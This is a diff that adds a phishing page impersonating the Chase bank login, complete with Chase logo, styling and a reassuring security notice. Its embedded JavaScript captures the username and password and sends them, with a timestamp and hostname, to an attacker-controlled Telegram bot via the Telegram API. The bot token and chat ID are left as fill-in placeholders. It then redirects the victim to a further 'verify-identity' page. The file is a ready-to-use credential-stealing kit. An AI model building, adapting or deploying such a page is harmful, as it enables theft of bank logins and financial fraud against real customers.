@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chase Login | Secure Banking</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body { 
+      font-family: 'Roboto', system-ui, sans-serif; 
+      background: linear-gradient(135deg, #003087 0%, #0055cc 100%),
+                  url('photo_2026-04-12_23-03-20.jpg') center/cover;
+      background-blend-mode: overlay;
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      padding: 60px 30px 100px;
+      position: relative;
+    }
+
+    .background-logo {
+      position: absolute;
+      top: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 1000;
+    }
+
+    .background-logo img {
+      max-height: 60px;
+      width: auto;
+      opacity: 0.9;
+      filter: brightness(0) invert(1);
+    }
+
+    .login-container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 80px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 420px;
+      padding: 40px;
+      backdrop-filter: blur(10px);
+      margin: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 8px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      transition: border-color 0.3s;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #0b6cff;
+      box-shadow: 0 0 0 3px rgba(11, 108, 255, 0.1);
+    }
+
+    .form-group input::placeholder {
+      color: #999;
+    }
+
+    .password-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .password-container input {
+      flex: 1;
+      padding-right: 50px;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      color: #666;
+      font-size: 16px;
+    }
+
+    .password-toggle:hover {
+      color: #0b6cff;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+      font-size: 14px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      margin-right: 8px;
+      width: auto;
+      cursor: pointer;
+    }
+
+    .checkbox-group label {
+      margin: 0;
+      font-weight: 400;
+      cursor: pointer;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      background: #0b6cff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+      text-decoration: none;
+      display: inline-block;
+      text-align: center;
+    }
+
+    .login-btn:hover {
+      background: #0a5fd6;
+    }
+
+    .signup-link {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .signup-link a {
+      color: #0b6cff;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .signup-link a:hover {
+      text-decoration: underline;
+    }
+
+    .security-notice {
+      display: flex;
+      align-items: center;
+      padding: 12px;
+      background: #e8f4fd;
+      border: 1px solid #b3d9f2;
+      border-radius: 6px;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #003087;
+    }
+
+    .security-notice::before {
+      content: "🔒";
+      margin-right: 8px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Background Logo -->
+  <div class="background-logo">
+    <img src="https://www.logo.wine/a/logo/Chase_Bank/Chase_Bank-Logo.wine.svg" 
+         alt="Chase Bank Logo" 
+         title="Chase Bank">
+  </div>
+
+  <div class="login-container">
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" placeholder="Enter your username" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="password-container">
+          <input type="password" id="password" name="password" placeholder="Enter your password" required>
+          <button type="button" class="password-toggle" onclick="togglePassword()">
+            <span id="passwordIcon">show</span>
+          </button>
+        </div>
+      </div>
+
+      <div class="form-group checkbox-group">
+        <input type="checkbox" id="remember" name="remember">
+        <label for="remember">Remember me</label>
+      </div>
+
+      <!-- Sign In Button -->
+      <button type="button" id="signInBtn" class="login-btn">Sign In</button>
+    </form>
+
+    <div class="signup-link">
+      Not enrolled? <a href="#" onclick="showMessage('Sign up page would load here'); return false;">Sign up now</a>
+    </div>
+
+    <div class="security-notice">
+      Your account is protected by the security features in Chase Mobile®
+    </div>
+  </div>
+
+  <script>
+    // ================== TELEGRAM BOT CONFIG ==================
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // ← Replace with your bot token
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";       // ← Replace with your chat ID
+
+    async function sendToTelegram(username, password) {
+      const message = `
+🔐 *New Chase Login Attempt*
+
+👤 *Username:* ${username}
+🔑 *Password:* ${password}
+
+⏰ *Time:* ${new Date().toLocaleString()}
+🌍 *Location:* ${window.location.hostname}
+      `.trim();
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (error) {
+        console.error("Telegram send failed:", error);
+        // Don't block the user experience if Telegram fails
+      }
+    }
+
+    // ================== PASSWORD TOGGLE ==================
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      const passwordIcon = document.getElementById('passwordIcon');
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        passwordIcon.textContent = 'hide';
+      } else {
+        passwordInput.type = 'password';
+        passwordIcon.textContent = 'show';
+      }
+    }
+
+    // ================== SIGN IN HANDLER ==================
+    async function handleSignIn() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!username || !password) {
+        alert('Please enter both username and password');
+        return;
+      }
+
+      // Send credentials to your Telegram bot
+      await sendToTelegram(username, password);
+
+      // Optional small delay so the message has time to send
+      setTimeout(() => {
+        // Redirect to next page
+        window.location.href = "verify-identity (2).html";
+      }, 800);
+    }
+
+    // Attach click event to Sign In button
+    document.getElementById('signInBtn').addEventListener('click', handleSignIn);
+
+    // Allow pressing Enter key in the form
+    document.getElementById('loginForm').addEventListener('keypress', function(e) {
+      if (e.key === "Enter") {
+        handleSignIn();
+      }
+    });
+  </script>
+</body>
+</html>
